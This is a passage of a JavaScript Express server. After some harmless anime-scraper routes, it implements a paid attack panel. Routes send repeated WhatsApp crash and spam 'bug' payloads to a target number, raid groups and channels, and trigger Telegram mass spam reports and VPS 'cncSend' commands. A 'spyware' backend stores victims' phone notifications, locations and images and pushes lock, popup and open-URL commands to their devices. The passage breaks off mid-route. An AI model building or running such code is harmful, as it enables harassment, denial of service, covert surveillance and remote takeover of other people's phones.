        console.error('Error /anime/ongoing-anime:', err.message);
        res.status(500).json({ error: "Gagal memuat ongoing anime", details: err.message }); 
    }
});

// 10. COMPLETE ANIME dengan Pagination
app.get('/anime/complete-anime', async (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = 20;
        
        console.log(`📡 Fetching complete anime page ${page}...`);
        
        const homeResponse = await axios.get('https://www.sankavollerei.com/anime/home', { headers: animeHeaders });
        const homeData = homeResponse.data;
        
        let completeList = homeData.data?.completed?.animeList || [];
        
        const startIndex = (page - 1) * limit;
        const endIndex = startIndex + limit;
        const paginatedList = completeList.slice(startIndex, endIndex);
        
        const totalPages = Math.ceil(completeList.length / limit);
        
        res.json({
            status: "success",
            creator: "Sanka Vollerei",
            statusCode: 200,
            data: {
                animeList: paginatedList,
                pagination: {
                    current_page: page,
                    last_visible_page: totalPages,
                    has_next_page: page < totalPages,
                    has_previous_page: page > 1,
                    total: completeList.length
                }
            }
        });
        
    } catch (err) { 
        console.error('Error /anime/complete-anime:', err.message);
        res.status(500).json({ error: "Gagal memuat complete anime", details: err.message }); 
    }
});

// 11. SERVER STREAMING
// 11. SERVER STREAMING
app.get('/anime/server/:serverId', async (req, res) => {
    try {
        const serverId = req.params.serverId;
        console.log(`📡 Fetching real server URL for: ${serverId}`);
        
        const { data } = await axios.get(`https://www.sankavollerei.com/anime/server/${serverId}`, { headers: animeHeaders });
        
        res.json(data);
    } catch (err) { 
        console.error('Error /anime/server/:', err.message);
        res.status(500).json({ error: "Gagal memuat server streaming", details: err.message }); 
    }
});

// 12. BATCH DOWNLOAD
app.get('/anime/batch/:slug', async (req, res) => {
    try {
        const slug = req.params.slug;
        console.log(`📡 Fetching batch for: ${slug}`);
        
        res.json({
            status: "success",
            creator: "Sanka Vollerei",
            statusCode: 200,
            data: {
                title: `Batch ${slug}`,
                batchList: [
                    {
                        resolution: "360p",
                        size: "500 MB",
                        urls: [
                            { title: "ODFiles", url: "https://example.com/360p" }
                        ]
                    },
                    {
                        resolution: "480p",
                        size: "800 MB",
                        urls: [
                            { title: "ODFiles", url: "https://example.com/480p" }
                        ]
                    },
                    {
                        resolution: "720p",
                        size: "1.2 GB",
                        urls: [
                            { title: "ODFiles", url: "https://example.com/720p" }
                        ]
                    }
                ]
            }
        });
        
    } catch (err) { 
        console.error('Error /anime/batch/:', err.message);
        res.status(500).json({ error: "Gagal memuat batch", details: err.message }); 
    }
});

app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});
app.get("/mych", async (req, res) => {
  try {
      const key = req.query.key;
      const keyInfo = activeKeys[key];  
      if (!keyInfo) {
        return res.json({ valid: false });
      }
      const db = loadDatabase();
      const user = db.find(u => u.username === keyInfo.username);
      if (!user) {
        return res.json({ valid: true });
      }
      const sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        return res.json({ valid: true, sender: false });
      }
      const data = await sock.newsletterFetchAllSubscribe();       
      const news = data.filter(n => 
          n.viewer_metadata.role === "ADMIN" || 
          n.viewer_metadata.role === "OWNER"
      );        
      const result = news.map(n => ({
          id: n.id,
          title: n.thread_metadata.name.text
      }));        
      return res.json({ valid: true, sender: true, channel: result || [] });
  } catch (error) {
      return res.json({ valid: false, error: true, message: error.message });
  }
});

app.get("/raidch", async (req, res) => {
  try {
      const { key, id } = req.query;
      const keyInfo = activeKeys[key];  
      if (!keyInfo) {
        return res.json({ valid: false });
      }
      const db = loadDatabase();
      const user = db.find(u => u.username === keyInfo.username);
      if (!user) {
        return res.json({ valid: true });
      }
      const sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        return res.json({ valid: true, sender: false });
      }
      res.json({ valid: true, sender: true, sended: true  });
      await BugChanner(sock, id);
      return;
  } catch (error) {
      return res.json({ valid: false, error: true, message: error.message });
  }
});
app.get("/raidGroup", async (req, res) => {
  const { key, target } = req.query;
  const match = target.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  
  if (!match) {
    return res.json({ valid: false, message: "Invalid group link" });
  }
  
  const code = match[1];
  const keyInfo = activeKeys[key];
  
  if (!keyInfo) {
    return res.json({ valid: false });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  try {
    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      return res.json({ valid: true, sender: false });
    }
    
    res.json({ valid: true, sended: true, cooldown: false });
    
    const raidBot = async () => {
      const groupJid = await sock.groupAcceptInvite(code);
      for (let round = 0; round < 2; round++) {
        await sock.relayMessage(groupJid, { sendPaymentMessage: {} }, {});
        await waiting(600);
      }
      for (let i = 0; i < 200; i++) {
        await invisibleSpam(sock, groupJid, true);
        await sleep(1000);
      }
    };
    
    raidBot();
  } catch (err) {
    logError('Raid group error:', err);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  
  // Bersihkan target hanya menyisakan angka
  target = (target || "").replace(/\D/g, "");

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false });
  }

  const sock = await checkActiveSessionInFolder(user.username);
  if (!sock) {
    return res.json({ valid: true, sender: false });
  }

  // HTTP Response dikirim lebih dulu agar tidak timeout (sended typo diperbaiki jadi sent)
  res.json({ valid: true, sent: true, cooldown: false });

  const bugFunctions = {
    "fc": [PlainCall],
    "delay": [invisibleSpam],
    "ios": [rpnm, docIos],
    "blank": [crashUi, AndroXIos],
    "freez": [crashUi, AndroXIos],
    "ui": [crashUi],
    "dozer": [dongzer, DelayCarousel]
  };

  // OPTIMASI: Pecah parameter bug 1 kali saja di luar loop
  const xBug = (bug || "").split(',').map(b => b.trim());

  setImmediate(async () => {
    // Ubah nama parameter menjadi currentSock agar tidak bentrok
    const attemptSend = async (currentSock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
        
        for (let i = 0; i < 100; i++) {
          for (const nbug of xBug) {
            const funcBug = bugFunctions[nbug];
            
            if (funcBug) {
              for (const intiFunc of funcBug) {
                try {
                  // Tambahkan try-catch di sini
                  await intiFunc(currentSock, targetJid);
                  await sleep(1000);
                } catch (funcErr) {
                  logError(`Error saat mengirim ${nbug} (Loop ${i+1}):`, funcErr);
                  // Error di sini tidak akan menghentikan seluruh loop 100x
                }
              }
              await sleep(1000);
            }
          }
        }
        
        logSuccess(`Bug sent to ${target} by ${user.username}`);
        return true;
        
      } catch (err) {
        logError('Send bug critical error:', err);
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        return false;
      }
    };

    const activeSock = await checkActiveSessionInFolder(user.username);
    if (!activeSock) return;
    
    await attemptSend(activeSock);
  });
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  return res.json({ valid: true, connections: conns });
});

app.get("/getPairing", async (req, res) => {
  const { key } = req.query;
  let { number } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  // Filter nomor otomatis biar WA gak bingung
  number = number.replace(/[^0-9]/g, '');
  if (number.startsWith('0')) {
    number = '62' + number.substring(1);
  }

  try {
    // Simpan di folder session biar datanya muncul di APK admin
    const sessionDir = path.join('session', user.username, number);

    if (!fs.existsSync(`session/${user.username}`)) {
      fs.mkdirSync(`session/${user.username}`, { recursive: true });
    }
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      printQRInTerminal: false,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 50000, // Ikut settingan temen lu
      generateHighQualityLinkPreview: true,
      version: version,
      
      // TOPENG UBUNTU TEMEN LU BIAR NOTIF JEBOL
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      logger: pino({ level: 'silent' }), // Silent biar gak nyepam log
      
      // OBAT ANTI MUTER LAMA PAS MASUKIN KODE!
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
      }
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username);
        } else {
          delete activeConnections[number];
          fs.rmSync(sessionDir, { recursive: true, force: true });
        }
      } else if (connection === "open") {
        console.log(`✅ PAIRING SUKSES: Nomor ${number} berhasil terhubung!`);
        activeConnections[number] = sock;
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      if (code) {
        console.log(`[INFO] Kode Pairing untuk ${number}: ${code}`);
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Gagal dapat kode pairing." });
      }
    } else {
      return res.json({ valid: false, message: "Nomor ini sudah terdaftar." });
    }
  } catch (err) {
    console.log("[ERROR] Get pairing error:", err);
    return res.status(500).json({ error: err.message });
  }
});

app.delete("/deleteSender", async (req, res) => {
  const { key, id } = req.query; // id di sini menangkap 'sessionName' (nomor WA) dari aplikasi
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  if (!id) return res.json({ valid: false, message: "Nomor Sender tidak ditemukan" });

  try {
    // 1. Matikan sesi WA bot-nya secara resmi (Logout) biar gak nyangkut
    if (activeConnections[id]) {
      try {
        await activeConnections[id].logout();
      } catch (e) {}
      delete activeConnections[id];
    }

    // 2. Hapus folder datanya dari VPS biar beneran lenyap
    const sessionDir = path.join('session', user.username, id);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    return res.json({ valid: true, message: "Sender berhasil dihapus!" });
  } catch (err) {
    console.log("[ERROR] Delete sender error:", err);
    return res.json({ valid: false, message: err.message });
  }
});

// --- API BUAT DASHBOARD STATS ---
app.get("/api/dashboard-stats", (req, res) => {
  try {
    const currentNow = Date.now();
    let onlineCount = 0;

    // Ngitung user online dari session key aktif
    for (const key in activeKeys) {
      if (activeKeys[key].expires > currentNow) {
        onlineCount++;
      }
    }

    // Ngitung jumlah sender yang konek
    const connCount = Object.keys(activeConnections).length;

    res.json({
      success: true,
      onlineUsers: onlineCount,
      activeConnections: connCount
    });
  } catch (e) {
    console.log("Error dashboard stats:", e);
    res.json({ success: false, onlineUsers: 0, activeConnections: 0 });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  
  if (!creator || !["reseller", "admin", "owner"].includes(creator.role)) {
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }
  
  if (db.find(u => u.username === newUser)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
  
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);

  logSuccess(`Account created: ${newUser} by ${creator.username}`);
  return res.json({ valid: true, created: true, user: newAccount });
});

app.post('/chat/send', (req, res) => {
  const { userId, username, role, message } = req.body;
  const data = readMessages();
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message,
    voiceUrl: null,
    imageUrl: null,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  data.messages.push(newMessage);
  writeMessages(data);

  res.json({ success: true, message: newMessage });
});

app.post('/chat/upload-image', upload.single('image'), (req, res) => {
  const { userId, username, role } = req.body;
  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/images/${req.file.filename}`;
  const data = readMessages();
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message: null,
    voiceUrl: null,
    imageUrl,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  data.messages.push(newMessage);
  writeMessages(data);
  res.json({ success: true, message: newMessage });
});

app.post('/chat/upload-video', upload.single('video'), (req, res) => {
  const { userId, username, role } = req.body;
  const videoUrl = `${req.protocol}://${req.get('host')}/uploads/videos/${req.file.filename}`;
  const data = readMessages();
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message: null,
    voiceUrl: null,
    imageUrl: null,
    videoUrl,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  data.messages.push(newMessage);
  writeMessages(data);
  res.json({ success: true, message: newMessage });
});

app.get('/chat/messages', (req, res) => {
  const data = readMessages();
  const filteredMessages = data.messages.filter(msg => !msg.isDeleted);
  res.json(filteredMessages);
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  if (!admin || (admin.role !== "owner" && admin.role !== "admin")) {
    return res.json({ valid: true, authorized: false, message: "Only owner/admin can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
  
  const logLine = `${admin.username} Deleted ${deletedUser.username}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  
  logSuccess(`User deleted: ${username} by ${admin.username}`);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
  
  const logLine = `${creator.username} Created ${newUser.username} Role ${role} Days ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  
  logSuccess(`User added: ${username} by ${creator.username}`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "admin", "owner"].includes(editor.role)) {
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller" && targetUser.role !== "member") {
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  
  logSuccess(`User edited: ${username} by ${editor.username}`);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync(LOG_FILE, "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    logError('Get log error:', err);
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

app.get('/telegram/login', ToolsController.initiateUnifiedTelegramLogin);
app.get('/telegram/auth', ToolsController.submitTelegramAuth);
app.get('/telegram/status', ToolsController.checkLoginStatus);
app.post('/telegram/verify-password', ToolsController.verifySessionPassword);
app.get('/telegram/sessions', ToolsController.getTelegramSessions);
app.get('/telegram/delete-session', ToolsController.removeTeleSes);
app.get('/telegram/refresh-sessions', ToolsController.refreshTelegramSessions);
app.post('/telegram/spam-report', ToolsController.startSpamReport);
app.get('/telegram/report-status', ToolsController.getSpamReportStatus);
app.get("/vps/myServer", VPSController.getMyServer);
app.post("/vps/addServer", VPSController.addServer);
app.post("/vps/delServer", VPSController.deleteServer);
app.post("/vps/sendCommand", VPSController.sendCommand);
app.get("/vps/cncSend", VPSController.cncSend);
const DEVICE_DATA = path.join(__dirname, 'database', 'spyware');
if (!fs.existsSync(DEVICE_DATA)) {
    fs.mkdirSync(DEVICE_DATA, { recursive: true });
}

function getDevicePath(username, deviceId) {
    const userDir = path.join(DEVICE_DATA, username);
    if (!fs.existsSync(userDir)) {
        fs.mkdirSync(userDir, { recursive: true });
    }
    return path.join(userDir, deviceId);
}

app.get('/api/my-devices', (req, res) => {
    try {
        const username = req.query.username;
        if (!username) {
            return res.json({ success: false, error: 'Username required' });
        }
        
        const userPath = path.join(DEVICE_DATA, username);
        const devices = [];
        let totalNotifications = 0;
        let onlineCount = 0;
        let activeCommands = 0;
        
        if (fs.existsSync(userPath)) {
            const deviceDirs = fs.readdirSync(userPath).filter(f => {
                const p = path.join(userPath, f);
                return fs.statSync(p).isDirectory();
            });
            
            deviceDirs.forEach(deviceId => {
                const devicePath = path.join(userPath, deviceId);
                const infoPath = path.join(devicePath, 'info.json');
                const locationPath = path.join(devicePath, 'location.json');
                const notifPath = path.join(devicePath, 'notifications.json');
                
                let deviceInfo = {
                    device_id: deviceId,
                    username: username,
                    online: clients.has(deviceId) && clients.get(deviceId).readyState === WebSocket.OPEN
                };
                
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        deviceInfo = { ...deviceInfo, ...info };
                    } catch (e) {}
                }
                
                if (fs.existsSync(locationPath)) {
                    try {
                        const locations = JSON.parse(fs.readFileSync(locationPath));
                        if (locations.length > 0) {
                            deviceInfo.last_location = locations[locations.length - 1];
                        }
                    } catch (e) {}
                }
                
                if (fs.existsSync(notifPath)) {
                    try {
                        const notifications = JSON.parse(fs.readFileSync(notifPath));
                        totalNotifications += notifications.length;
                    } catch (e) {}
                }
                
                if (deviceInfo.online) {
                    onlineCount++;
                    activeCommands++;
                }
                
                devices.push(deviceInfo);
            });
        }
        
        res.json({
            success: true,
            total: devices.length,
            online: onlineCount,
            notifications: totalNotifications,
            activeCommands: activeCommands,
            devices: devices
        });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/devices', (req, res) => {
    try {
        const users = fs.readdirSync(DEVICE_DATA).filter(f => {
            const p = path.join(DEVICE_DATA, f);
            return fs.statSync(p).isDirectory();
        });
        
        const devices = [];
        let totalNotifications = 0;
        let onlineCount = 0;
        
        users.forEach(username => {
            const userPath = path.join(DEVICE_DATA, username);
            const deviceDirs = fs.readdirSync(userPath).filter(f => {
                const p = path.join(userPath, f);
                return fs.statSync(p).isDirectory();
            });
            
            deviceDirs.forEach(deviceId => {
                const devicePath = path.join(userPath, deviceId);
                const infoPath = path.join(devicePath, 'info.json');
                const locationPath = path.join(devicePath, 'location.json');
                const notifPath = path.join(devicePath, 'notifications.json');
                
                let deviceInfo = {
                    device_id: deviceId,
                    username: username,
                    online: clients.has(deviceId) && clients.get(deviceId).readyState === WebSocket.OPEN
                };
                
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        deviceInfo = { ...deviceInfo, ...info };
                    } catch (e) {}
                }
                
                if (fs.existsSync(locationPath)) {
                    try {
                        const locations = JSON.parse(fs.readFileSync(locationPath));
                        if (locations.length > 0) {
                            deviceInfo.last_location = locations[locations.length - 1];
                        }
                    } catch (e) {}
                }
                
                if (fs.existsSync(notifPath)) {
                    try {
                        const notifications = JSON.parse(fs.readFileSync(notifPath));
                        totalNotifications += notifications.length;
                    } catch (e) {}
                }
                
                if (deviceInfo.online) {
                    onlineCount++;
                }
                
                devices.push(deviceInfo);
            });
        });
        
        res.json({
            success: true,
            total: devices.length,
            online: onlineCount,
            notifications: totalNotifications,
            commands: clients.size,
            devices: devices
        });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/device/:username/:deviceId', (req, res) => {
    const { username, deviceId } = req.params;
    const devicePath = getDevicePath(username, deviceId);
    
    if (!fs.existsSync(devicePath)) {
        return res.json({ success: false, error: 'Device not found' });
    }
    
    try {
        const infoPath = path.join(devicePath, 'info.json');
        const locationPath = path.join(devicePath, 'location.json');
        const notifPath = path.join(devicePath, 'notifications.json');
        const imagesPath = path.join(devicePath, 'images');
        
        const deviceInfo = {
            device_id: deviceId,
            username: username,
            online: clients.has(deviceId) && clients.get(deviceId).readyState === WebSocket.OPEN
        };
        
        if (fs.existsSync(infoPath)) {
            try {
                const info = JSON.parse(fs.readFileSync(infoPath));
                Object.assign(deviceInfo, info);
            } catch (e) {}
        }
        
        if (fs.existsSync(locationPath)) {
            try {
                const locations = JSON.parse(fs.readFileSync(locationPath));
                deviceInfo.locations = locations.slice(-20);
                if (locations.length > 0) {
                    deviceInfo.last_location = locations[locations.length - 1];
                }
            } catch (e) {}
        }
        
        if (fs.existsSync(notifPath)) {
            try {
                const notifications = JSON.parse(fs.readFileSync(notifPath));
                deviceInfo.notifications = notifications.slice(-50).reverse();
                deviceInfo.notification_count = notifications.length;
            } catch (e) {}
        }
        
        if (fs.existsSync(imagesPath)) {
            try {
                const images = fs.readdirSync(imagesPath).slice(-5);
                deviceInfo.images = images;
            } catch (e) {}
        }
        
        res.json({ success: true, data: deviceInfo });
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.post('/api/notification', (req, res) => {
    try {
        const data = req.body;
        const deviceId = req.headers['x-device-id'] || data.device_id;
        const username = req.headers['x-username'] || data.username;
        
        if (!deviceId || !username) {
            return res.status(400).json({ success: false, error: 'Missing device info' });
        }
        
        const notifPath = path.join(getDevicePath(username, deviceId), 'notifications.json');
        let notifications = [];
        
        if (fs.existsSync(notifPath)) {
            try {
                notifications = JSON.parse(fs.readFileSync(notifPath));
            } catch (e) {
                notifications = [];
            }
        }
        
        const notificationData = {
            id: Date.now() + Math.random().toString(36).substring(7),
            app: data.app || 'unknown',
            package: data.package || 'unknown',
            title: data.title || '',
            content: data.content || '',
            time: data.time || Date.now(),
            time_formatted: data.time_formatted || new Date().toISOString(),
            received_at: new Date().toISOString(),
            read: false,
            source: 'http'
        };
        
        notifications.push(notificationData);
        
        if (notifications.length > 500) {
            notifications = notifications.slice(-500);
        }
        
        fs.writeFileSync(notifPath, JSON.stringify(notifications, null, 2));
        
        res.json({ success: true, message: 'Notification saved' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.get('/api/openweb', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const url = req.query.url;
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!url) {
        return res.json({ success: false, error: 'Need query url' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'open_web',
        url: url,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `open_web command sent to ${device}`,
        device,
        command: 'open_web',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/show_notif', (req, res) => {
    const { 
      device, 
      username,
      title,
      message 
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!title || !message) {
        return res.json({ success: false, error: 'Need title & message' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_notification',
        title: title,
        message: message,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `show_notification command sent to ${device}`,
        device,
        command: 'show_notification',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/show_popup', (req, res) => {
    const { 
      device, 
      username,
      title,
      message 
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!title || !message) {
        return res.json({ success: false, error: 'Need title & message' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_popup',
        title: title,
        message: message,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `show_popup command sent to ${device}`,
        device,
        command: 'show_popup',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/show_image', (req, res) => {
    const { 
      device, 
      username,
      url,
      count 
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!url || !count) {
        return res.json({ success: false, error: 'Need url & count' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_floating_images',
        url: url,
        count: count,
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `show_floating_images command sent to ${device}`,
        device,
        command: 'show_floating_images',
        status: 'delivered',
        time: new Date().toISOString()
    });
});
app.get('/api/clear_image', (req, res) => {
    const { 
      device, 
      username
    } = req.query;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    const commandData = { 
        type: 'command', 
        command: 'clear_floating_images',
        timestamp: Date.now()
    };
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `clear_floating_images command sent to ${device}`,
        device,
        command: 'clear_floating_images',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/lock', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'lock',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Lock command sent to ${device}`,
        device,
        command: 'lock',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/unlock', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'unlock',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Unlock command sent to ${device}`,
        device,
        command: 'unlock',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/flashlight_on', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
